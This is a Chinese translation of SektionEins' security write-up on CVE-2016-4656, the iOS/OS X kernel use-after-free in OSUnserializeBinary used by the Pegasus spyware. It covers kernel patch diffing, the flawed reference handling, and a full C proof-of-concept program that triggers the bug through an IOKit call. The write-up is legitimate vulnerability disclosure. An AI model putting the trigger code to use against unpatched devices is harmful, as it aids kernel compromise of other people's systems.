> 原文链接: https://www.anquanke.com//post/id/84493 


# iOS三叉戟漏洞补丁分析、利用代码 公布（POC）


                                阅读量   
                                **117916**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：安全客
                                <br>原文地址：[http://sektioneins.de/en/blog/16-09-02-pegasus-ios-kernel-vulnerability-explained.html](http://sektioneins.de/en/blog/16-09-02-pegasus-ios-kernel-vulnerability-explained.html)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p4.ssl.qhimg.com/t0128f0caf00262cf8e.jpg)](https://p4.ssl.qhimg.com/t0128f0caf00262cf8e.jpg)

**<br>**

**1.介绍**

2016年8月25日,针对最近出现的iOS监视工具PEGASUS,苹果发布了重要的安全更新:iOS 9.3.5。与之前发现的iOS恶意软件不同，这个工具包使用了三个不同的iOS 0 day漏洞，可以让所有打了补丁(iOS 9.3.5之前的版本)的iOS设备妥协。不幸的是，有关这些漏洞的公开信息很少,这是因为Citizenlab and Lookout (漏洞发现者)和苹果已经决定对公众隐瞒细节。直到此时,他们仍没有向公众公开恶意软件样本，因此，独立地进行第三方分析是不可能完成的。

站在SektionEins的立场，我们认为向公众隐瞒已修复漏洞的细节并非正确的做法,由于我们在解决iOS内核问题上比较专业,于是决定来看看苹果发布的安全补丁,以找出被PEGASUS利用的漏洞。

该事件前期相关报道、报告：

[iOS 9.3.5紧急发布背后真相:NSO使用iPhone 0day无需点击远程攻破苹果手机（8月26日 13:41更新）](http://bobao.360.cn/news/detail/3497.html)

 

**2.补丁分析**

事实上，分析iOS安全补丁并没有我们当初想象得那么简单，因为iOS 9内核是以加密的形式被存储在设备中的(在固件文件中)。如果想获取解密后的内核，我们有两个选择：一种是拥有一个允许解密内核的低水平利用,另一种是破解存在问题的iOS版本,然后从核心内存里将它转储出来。我们决定使用第二种方法，我们在实验室内的iOS测试设备中，用自己的破解版本转储了iOS 9.3.4和iOS 9.3.5的内核。Mathew Solnik曾在一篇博客文章中对我们通常的做法有所描述,他透露说, 通过内核利用，我们可以从物理内存中转储完全解密的iOS内核。

转储出两个内核后，我们需要分析它们的差异。我们使用IDA中的开源二进制diffing插件Diaphora来完成这个任务，为了进行比较，我们将iOS 9.3.4内核加载到了IDA,然后等待自动分析完成，然后运用Diaphora将当前IDA数据库以同样的格式转储到SQLITE数据库。对于iOS 9.3.5内核，我们重复了一次这个过程,然后命令Diaphora比较两个数据库的差异。比较的结果可在以下的画面中看到：

[![](https://p2.ssl.qhimg.com/t01d78194a752036c2a.png)](https://p2.ssl.qhimg.com/t01d78194a752036c2a.png)

Diaphora发现了iOS 9.3.5中的一些新函数。然而,其中大多数只是跳转目标发生了变化。从变动函数的列表中，我们可以明显看出OSUnserializeXML是其中最值得探究的函数。分析该函数的差异是非常困难的,因为相较于iOS 9.3.4，这个函数在iOS 9.3.5中已经发生了很大的改变(由于重新排序)。然而进一步的分析显示,它实际上还内联着另一个函数,通过观察XNU（类似于iOS内核）的源代码，找到漏洞似乎会变得较为容易。OS X 10.11.6内的XNU内核可以在opensource.apple.com上找到。

对代码进行调查后显示,内联函数实际上是OSUnserializeBinary。



```
OSObject*
OSUnserializeXML(const char *buffer, size_t bufferSize, OSString **errorString)
`{`
        if (!buffer) return (0);
        if (bufferSize &lt; sizeof(kOSSerializeBinarySignature)) return (0);
        if (!strcmp(kOSSerializeBinarySignature, buffer)) return OSUnserializeBinary(buffer, bufferSize, errorString);
        // XML must be null terminated
        if (buffer[bufferSize - 1]) return 0;
        return OSUnserializeXML(buffer, errorString);
`}`
```



**3.OSUnserializeBinary**

OSUnserializeBinary是添加到OSUnserializeXML上的相对较新的代码，主要负责处理二进制序列化数据。这个函数接触到用户输入的方式与OSUnserializeXML相同。由于IOKit API允许对参数进行序列化，因此攻击者只需调用任意的IOKit API(或mach API)，就可以滥用它们。同时,该漏洞也可以从iOS或OS X上任意沙箱的内部触发。

这个新函数的源代码位于libkern/c++/OSSerializeBinary.cpp,因此可以直接审查，不用确切地分析苹果应用的补丁。这个新的序列化格式的二进制格式并不是很复杂，它由一个32位标识符作为数据头,其次是32位对齐标记和数据对象。

支持以下数据类型:

**·Dictionary**

**·Array**

**·Set**

**·Number**

**·Symbol**

**·String**

**·Data**

**·Boolean**

**·Object (reference to previously deserialized object)**

二进制格式将这些数据类型编码成24-30位。较低的24位被作为数值数据保留下来，例如存储长度或集合元素计数器。第31位标志着集合的最后一个元素，其他的所有数据(字符串、符号、二进制数据、数字)占用了四字节，对齐到datastream。下文列出的POC就是一个例子。

 

**4.漏洞**

现在，找出漏洞变得较为简单了,因为它类似于之前PHP函数unserialize()中的use after free 漏洞， SektionEins此前曾在PHP.net将该漏洞披露出来。OSUnserialize()内的漏洞也出自相同的原因:在反序列化过程中，反序列化器可以对先前释放的对象创建引用。

每个对象在经过反序列化后,都会被添加到一个对象目录中。代码是这样的:

```
if (!isRef)
`{`
        setAtIndex(objs, objsIdx, o);
        if (!ok) break;
        objsIdx++;
`}`
```

这是不安全的,而PHP也犯过同样的错误，这是因为setAtIndex()宏不会让对象的引用计数增加，你可以在这里看到：



```
define setAtIndex(v, idx, o)
        if (idx &gt;= v##Capacity)                                                                                                         
        `{`
                uint32_t ncap = v##Capacity + 64;
                typeof(v##Array) nbuf = (typeof(v##Array)) kalloc_container(ncap * sizeof(o));
                if (!nbuf) ok = false;
                if (v##Array)
                `{`
                        bcopy(v##Array, nbuf, v##Capacity * sizeof(o));
                        kfree(v##Array, v##Capacity * sizeof(o));
                `}`
                v##Array    = nbuf;
                v##Capacity = ncap;
        `}`
        if (ok) v##Array[idx] = o;   &lt;---- remember object WITHOUT COUNTING THE REFERENCE
```



在反序列化过程中，如果没有一种合法释放对象的方式，那么不记录v##Array内的引用数将不会出现什么问题。不巧的是，至少有一种代码路径允许在反序列化过程中释放对象。你可以从下面的代码中看到，字典元素的处理支持OSSymbol和OSString key，然而在OSString key的情形下，它们会在OSString对象损坏后转换至OSSymbol，而在OSString对象破坏时，它已经被添加到了theobjs对象表。



```
if (dict)
`{`
        if (sym)
        `{`
                DEBG("%s = %sn", sym-&gt;getCStringNoCopy(), o-&gt;getMetaClass()-&gt;getClassName());
                if (o != dict) ok = dict-&gt;setObject(sym, o, true);
                o-&gt;release();
                sym-&gt;release();
                sym = 0;
        `}`
        else
        `{`
                sym = OSDynamicCast(OSSymbol, o);
                if (!sym &amp;&amp; (str = OSDynamicCast(OSString, o)))
                `{`
                    sym = (OSSymbol *) OSSymbol::withString(str);
                    o-&gt;release();  &lt;---- destruction of OSString object that is already in objs table
                    o = 0;
                `}`
                ok = (sym != 0);
        `}`
`}`
```



因此，用kOSSerializeObject数据类型来创建已损坏的OSString对象的引用是可行的，这是一个典型的use after free漏洞。

 

**5.POC**

找出了问题后,我们创建了一个简单的POC来触发这个漏洞,下面的图中就是POC。你可以在OS X上试试(因为它和iOS有一样的漏洞)。

```
/*
 * Simple POC to trigger CVE-2016-4656 (C) Copyright 2016 Stefan Esser / SektionEins GmbH
 * compile on OS X like:
 *    gcc -arch i386 -framework IOKit -o ex exploit.c
 */
#include &lt;unistd.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;mach/mach.h&gt;
#include &lt;IOKit/IOKitLib.h&gt;
#include &lt;IOKit/iokitmig.h&gt;
 
enum
`{`
  kOSSerializeDictionary   = 0x01000000U,
  kOSSerializeArray        = 0x02000000U,
  kOSSerializeSet          = 0x03000000U,
  kOSSerializeNumber       = 0x04000000U,
  kOSSerializeSymbol       = 0x08000000U,
  kOSSerializeString       = 0x09000000U,
  kOSSerializeData         = 0x0a000000U,
  kOSSerializeBoolean      = 0x0b000000U,
  kOSSerializeObject       = 0x0c000000U,
  kOSSerializeTypeMask     = 0x7F000000U,
  kOSSerializeDataMask     = 0x00FFFFFFU,
  kOSSerializeEndCollecton = 0x80000000U,
`}`;
 
#define kOSSerializeBinarySignature "323"
 
int main()
`{`
  char * data = malloc(1024);
  uint32_t * ptr = (uint32_t *) data;
  uint32_t bufpos = 0;
  mach_port_t master = 0, res;
  kern_return_t kr;
 
  /* create header */
  memcpy(data, kOSSerializeBinarySignature, sizeof(kOSSerializeBinarySignature));
  bufpos += sizeof(kOSSerializeBinarySignature);
 
  /* create a dictionary with 2 elements */
  *(uint32_t *)(data+bufpos) = kOSSerializeDictionary | kOSSerializeEndCollecton | 2; bufpos += 4;
  /* our key is a OSString object */
  *(uint32_t *)(data+bufpos) = kOSSerializeString | 7; bufpos += 4;
  *(uint32_t *)(data+bufpos) = 0x41414141; bufpos += 4;
  *(uint32_t *)(data+bufpos) = 0x00414141; bufpos += 4;
  /* our data is a simple boolean */
  *(uint32_t *)(data+bufpos) = kOSSerializeBoolean | 64; bufpos += 4;
  /* now create a reference to object 1 which is the OSString object that was just freed */
  *(uint32_t *)(data+bufpos) = kOSSerializeObject | 1; bufpos += 4;
 
  /* get a master port for IOKit API */
  host_get_io_master(mach_host_self(), &amp;master);
  /* trigger the bug */
  kr = io_service_get_matching_services_bin(master, data, bufpos, &amp;res);
  printf("kr: 0x%xn", kr);
`}`
```

 

**6.利用**

因为我们才刚刚分析了这个问题，所以还没有来得及对这个漏洞开发出一种利用。但是我们随后会为这个漏洞开发出一种完全可行的利用，今年的晚些时候，我们会在柏林的iOS内核开发培训课程上将它展示出来。

该事件前期相关报道、报告：

[iOS 9.3.5紧急发布背后真相:NSO使用iPhone 0day无需点击远程攻破苹果手机（8月26日 13:41更新）](http://bobao.360.cn/news/detail/3497.html)


